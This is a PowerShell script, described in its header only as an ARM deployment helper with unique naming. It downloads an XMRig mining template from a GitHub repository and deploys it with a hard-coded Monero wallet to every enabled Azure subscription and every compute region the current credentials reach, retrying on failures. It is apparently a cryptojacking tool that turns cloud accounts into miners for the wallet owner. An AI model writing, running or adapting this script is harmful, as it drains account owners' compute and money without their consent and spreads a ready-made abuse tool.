<#
.SYNOPSIS
    Deploys ARM template with unique naming to avoid conflicts
    
.DESCRIPTION
    Enhanced version that generates unique names for all resources to prevent
    "already exists" errors across multiple deployments
#>

param(
    [string]$TemplateUrl = "https://raw.githubusercontent.com/myhomemail565-gif/cryptocloud/master/xmrig/azure/arm/template.json",
    [string]$Wallet = "85fHndEnn5geDRAuWvnrvTR8PE8KmztiQev95rDoQqvyAdibnfSGQX2Ww4V4XadbX6VxbZ1Q2uWYcUWjhqxseojY4o2GTeb",
    [string]$ResourceGroupPrefix = "crypto",
    [switch]$GenerateUniqueNames = $true,
    [string]$NameSuffix = ""
)

# Function to generate unique identifier
function Get-UniqueIdentifier {
    param([string]$SubscriptionId, [string]$Location)
    
    # Use first 8 chars of subscription ID and location code
    $subHash = $SubscriptionId.Substring(0,8).ToLower()
    $locCode = $Location.Replace(' ', '').Replace('-', '').ToLower().Substring(0,6)
    
    # Add timestamp component
    $timeStamp = (Get-Date).ToString("HHmm")
    
    return "$subHash$locCode$timeStamp"
}

# Function to deploy with unique parameters
function Deploy-WithUniqueNaming {
    param(
        [string]$SubscriptionId,
        [string]$SubscriptionName,
        [string]$Location,
        [hashtable]$OriginalParameters
    )
    
    # Generate unique names for this deployment
    $uniqueId = Get-UniqueIdentifier -SubscriptionId $SubscriptionId -Location $Location
    $rgName = "$ResourceGroupPrefix-$($Location.ToLower().Replace(' ', '-').Replace('--', '-'))-$uniqueId"
    
    Write-Host "  Generated unique ID: $uniqueId" -ForegroundColor DarkCyan
    Write-Host "  Resource Group: $rgName" -ForegroundColor Cyan
    
    # Create deployment parameters hashtable
    $deploymentParams = @{
        ResourceGroupName = $rgName
        TemplateUri = $TemplateUrl
        Name = "deploy-$uniqueId"
        location = $Location
        Force = $true
        ErrorAction = 'Stop'
    }
    
    # Check if template expects specific parameters
    try {
        # Download template to inspect parameters
        $templateContent = Invoke-RestMethod -Uri $TemplateUrl -ErrorAction Stop
        
        # Add wallet parameter if template expects it
        if ($templateContent.parameters.PSObject.Properties.Name -contains "User_wallet") {
            $deploymentParams['User_wallet'] = $Wallet
        }
        
        # Generate unique names for resources that need them
        if ($templateContent.parameters.PSObject.Properties.Name -contains "storageAccountName") {
            $storageName = "strg$($uniqueId.ToLower())"
            $deploymentParams['storageAccountName'] = $storageName
            Write-Host "  Storage account: $storageName" -ForegroundColor Gray
        }
        
        if ($templateContent.parameters.PSObject.Properties.Name -contains "vmName") {
            $vmName = "vm-$($Location.ToLower().Substring(0,3))-$uniqueId"
            $deploymentParams['vmName'] = $vmName
            Write-Host "  VM name: $vmName" -ForegroundColor Gray
        }
        
        if ($templateContent.parameters.PSObject.Properties.Name -contains "publicIPAddressName") {
            $ipName = "ip-$uniqueId"
            $deploymentParams['publicIPAddressName'] = $ipName
        }
        
        if ($templateContent.parameters.PSObject.Properties.Name -contains "virtualNetworkName") {
            $vnetName = "vnet-$uniqueId"
            $deploymentParams['virtualNetworkName'] = $vnetName
        }
        
        if ($templateContent.parameters.PSObject.Properties.Name -contains "networkInterfaceName") {
            $nicName = "nic-$uniqueId"
            $deploymentParams['networkInterfaceName'] = $nicName
        }
        
    }
    catch {
        Write-Host "  Warning: Could not inspect template, using basic parameters" -ForegroundColor Yellow
        $deploymentParams['User_wallet'] = $Wallet
    }
    
    # Add custom suffix if provided
    if ($NameSuffix) {
        $deploymentParams['resourceNameSuffix'] = $NameSuffix
    }
    
    try {
        # Create resource group
        Write-Host "  Creating resource group..." -ForegroundColor Gray
        $rg = New-AzResourceGroup -Name $rgName -Location $Location -Force -Tag @{
            DeployedBy = $env:USERNAME;
            DeploymentTime = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss");
            Subscription = $SubscriptionName;
            Wallet = $Wallet.Substring(0,10) + "...";
            Template = [System.IO.Path]::GetFileName($TemplateUrl)
        }
        
        # Deploy template with WhatIf first (preview)
        Write-Host "  Previewing deployment (WhatIf)..." -ForegroundColor Gray
        $whatIfResult = New-AzResourceGroupDeployment @deploymentParams -WhatIf -ErrorAction SilentlyContinue
        
        if ($whatIfResult) {
            Write-Host "  WhatIf completed. Proceeding with actual deployment..." -ForegroundColor Green
        }
        
        # Actual deployment
        Write-Host "  Deploying resources..." -ForegroundColor Gray
        $deployment = New-AzResourceGroupDeployment @deploymentParams
        
        Write-Host "  SUCCESS: Deployment '$($deployment.DeploymentName)' completed" -ForegroundColor Green
        Write-Host "  State: $($deployment.ProvisioningState)" -ForegroundColor Green
        
        # Output important resources
        if ($deployment.Outputs) {
            Write-Host "  Outputs:" -ForegroundColor DarkGray
            foreach ($output in $deployment.Outputs.Keys) {
                Write-Host "    $output : $($deployment.Outputs[$output].Value)" -ForegroundColor DarkGray
            }
        }
        
        return @{
            Success = $true
            ResourceGroup = $rgName
            DeploymentName = $deployment.DeploymentName
            Outputs = $deployment.Outputs
        }
    }
    catch {
        Write-Host "  FAILED: $($_.Exception.Message)" -ForegroundColor Red
        
        # Specific handling for common errors
        if ($_.Exception.Message -like "*already exists*") {
            Write-Host "  ACTION: Generated new unique names and retrying..." -ForegroundColor Yellow
            
            # Generate even more unique ID and retry once
            $uniqueId = Get-UniqueIdentifier -SubscriptionId $SubscriptionId -Location $Location
            $uniqueId = "$uniqueId$(Get-Random -Minimum 100 -Maximum 999)"
            
            Write-Host "  New unique ID: $uniqueId" -ForegroundColor Yellow
            $deploymentParams['Name'] = "deploy-$uniqueId"
            
            # Retry with new name
            try {
                $deployment = New-AzResourceGroupDeployment @deploymentParams
                Write-Host "  RETRY SUCCESSFUL!" -ForegroundColor Green
                return @{
                    Success = $true
                    ResourceGroup = $rgName
                    DeploymentName = $deployment.DeploymentName
                    Outputs = $deployment.Outputs
                }
            }
            catch {
                Write-Host "  Retry also failed: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        
        # Try alternative - deploy without certain parameters
        if ($_.Exception.Message -like "*parameter * not found*") {
            Write-Host "  ACTION: Removing problematic parameters and retrying..." -ForegroundColor Yellow
            
            # Remove parameters that might not exist in template
            $deploymentParams.Remove('storageAccountName')
            $deploymentParams.Remove('vmName')
            $deploymentParams.Remove('publicIPAddressName')
            $deploymentParams.Remove('virtualNetworkName')
            $deploymentParams.Remove('networkInterfaceName')
            
            try {
                $deployment = New-AzResourceGroupDeployment @deploymentParams
                Write-Host "  SUCCESS with simplified parameters!" -ForegroundColor Green
                return @{Success = $true; ResourceGroup = $rgName}
            }
            catch {
                Write-Host "  Simplified approach failed: $_" -ForegroundColor Red
            }
        }
        
        return @{
            Success = $false
            Error = $_.Exception.Message
            ResourceGroup = $rgName
        }
    }
}

# Main execution with subscription/location loop
Write-Host "=== ARM Deployment with Unique Naming ===" -ForegroundColor Yellow
Write-Host "Template: $TemplateUrl" -ForegroundColor Cyan
Write-Host "Wallet: $Wallet (first 10 chars: $($Wallet.Substring(0,10))...)" -ForegroundColor Cyan
Write-Host ""



# Get subscriptions
$subscriptions = Get-AzSubscription | Where-Object {$_.State -eq 'Enabled'}
Write-Host "Found $($subscriptions.Count) enabled subscriptions" -ForegroundColor Green

$results = @()

foreach ($subscription in $subscriptions) {
    Write-Host "`n" + ("=" * 60) -ForegroundColor DarkGray
    Write-Host "Subscription: $($subscription.Name)" -ForegroundColor White -BackgroundColor DarkBlue
    
    Set-AzContext -Subscription $subscription.Id | Out-Null
    
    # Get available locations
    $locations = (Get-AzLocation | Where-Object {
        $_.Providers -contains "Microsoft.Compute" -and
        $_.Location -notlike "*stage*"
    }).Location | Sort-Object
    
    Write-Host "Processing $($locations.Count) locations..." -ForegroundColor Cyan
    
    foreach ($location in $locations) {
        Write-Host "`n  Location: $location" -ForegroundColor Cyan
        
        $result = Deploy-WithUniqueNaming -SubscriptionId $subscription.Id `
                                         -SubscriptionName $subscription.Name `
                                         -Location $location `
                                         -OriginalParameters @{User_wallet = $Wallet}
        
        $results += [PSCustomObject]@{
            Subscription = $subscription.Name
            Location = $location
            Success = $result.Success
            ResourceGroup = $result.ResourceGroup
            Error = if ($result.Error) { $result.Error } else { $null }
            Timestamp = Get-Date
        }
        
        # Brief pause between deployments
        Start-Sleep -Seconds 2
    }
}

# Summary report
Write-Host "`n" + ("=" * 60) -ForegroundColor DarkGray
Write-Host "DEPLOYMENT SUMMARY" -ForegroundColor Yellow
Write-Host "=" * 60 -ForegroundColor DarkGray

$successCount = ($results | Where-Object {$_.Success -eq $true}).Count
$failCount = ($results | Where-Object {$_.Success -eq $false}).Count

Write-Host "Total deployments attempted: $($results.Count)" -ForegroundColor Cyan
Write-Host "Successful: $successCount" -ForegroundColor Green
Write-Host "Failed: $failCount" -ForegroundColor Red

if ($failCount -gt 0) {
    Write-Host "`nFailed deployments:" -ForegroundColor Red
    $results | Where-Object {$_.Success -eq $false} | Format-Table Subscription, Location, Error -AutoSize
}

# Export results
$results | Export-Csv -Path ".\DeploymentResults_$(Get-Date -Format 'yyyyMMdd_HHmm').csv" -NoTypeInformation
Write-Host "`nResults exported to CSV file" -ForegroundColor Gray
